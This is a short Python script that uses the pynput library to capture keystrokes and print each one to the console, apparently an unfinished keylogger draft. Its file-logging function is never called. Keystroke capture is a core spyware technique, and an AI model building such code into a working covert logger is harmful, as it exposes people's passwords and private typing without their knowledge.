import pynput

from pynput.keyboard import Key, Listener
count = 0
keys = []

def press(key):
    global keys, count
    print(f"{key} wciśniety")

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(key)

def release(key):
    if key == Key.esc:
        return False

with Listener(on_press=press, on_release=release) as listener:
    listener.join()
